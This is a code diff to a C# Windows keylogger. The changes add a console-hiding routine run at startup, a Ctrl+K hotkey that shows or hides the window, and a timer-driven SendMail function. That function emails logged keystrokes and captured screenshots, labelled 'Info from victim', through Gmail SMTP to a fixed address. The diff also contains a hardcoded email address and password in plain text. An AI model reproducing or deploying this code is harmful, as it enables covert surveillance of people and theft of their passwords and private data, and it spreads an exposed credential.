@@ -5,6 +5,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -13,18 +14,15 @@ using System.Windows.Forms;
 
 namespace Key_Logger_2_0_2
 {
-    internal class Program
+    class Program
     {
         #region hook key board
-        //mã mặc định của win
-        private const int WH_KEYBOARD_LL = 13;//mã khi phím khi vừa nhả lên
-        private const int WM_KEYDOWN = 0x0100;//mã phím khi vừa ấn xuống
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
 
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        //mỗi cửa sổ đều có 1 handle là id, hookid lưu ,mã đó
 
-        //tạo file ghi giữ liệu
         private static string logName = "Log_";
         private static string logExtendtion = ".txt";
 
@@ -55,14 +53,9 @@ namespace Key_Logger_2_0_2
 
         /// <summary>
         /// Set hook into all current process
-        ///hàm lấy ra tất cả các process
-        //// từ các process lấy ra main window của nó
-        //// sau đó thả mồi vào trương trình, lấy ra handle của trương trình đó
-        //// WH_KEYBOARD_LL: mã lấy ra thông tin bản phím, nếu đổi mã vd mouse thì lấy ra thông tin chuột
         /// </summary>
         /// <param name="proc"></param>
         /// <returns></returns>
-
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -89,6 +82,7 @@ namespace Key_Logger_2_0_2
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
+                CheckHotKey(vkCode);
                 WriteLog(vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -117,7 +111,32 @@ namespace Key_Logger_2_0_2
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
-        #endregion
+
+        static bool isHotKey = false;
+        static bool isShowing = false;
+        static Keys previoursKey = Keys.Separator;
+
+        static void CheckHotKey(int vkCode)
+        {
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
+                isHotKey = true;
+
+            if (isHotKey)
+            {
+                if (!isShowing)
+                {
+                    DisplayWindow();
+                }
+                else
+                    HideWindow();
+
+                isShowing = !isShowing;
+            }
+
+            previoursKey = (Keys)vkCode;
+            isHotKey = false;
+        }
+        #endregion      
 
         #region Capture
         static string imagePath = "Image_";
@@ -169,36 +188,115 @@ namespace Key_Logger_2_0_2
 
         #endregion
 
-        #region timer thread
+        #region Timer
         static int interval = 1;
-        static void start_timer()
+        static void StartTimmer()
         {
-            Thread thread = new Thread(() =>
-            {
+            Thread thread = new Thread(() => {
                 while (true)
                 {
                     Thread.Sleep(1);
-                    if(interval % captureTime == 0)
-                    {
+
+                    if (interval % captureTime == 0)
                         CaptureScreen();
-                    }
+
+                    if (interval % mailTime == 0)
+                        SendMail();
+
                     interval++;
 
-                    if(interval >= 100000)
-                    {
+                    if (interval >= 1000000)
                         interval = 0;
-                    }
                 }
             });
             thread.IsBackground = true;
             thread.Start();
         }
         #endregion
+
+        #region Windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        const int SW_HIDE = 0;
+
+        // show window code
+        const int SW_SHOW = 5;
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion        
+
+        #region Mail
+        static int mailTime = 5000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("email@gmail.com");
+                mail.To.Add("xuanhoangk69@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info from victim\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("xuanhoangk69@gmail.com", "hoang2402");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+                // phải làm cái này ở mail dùng để gửi phải bật lên
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+        #endregion
         static void Main(string[] args)
         {
-            start_timer();
+            HideWindow();
+
+            StartTimmer();
             HookKeyboard();
-             
         }
     }
+
 }
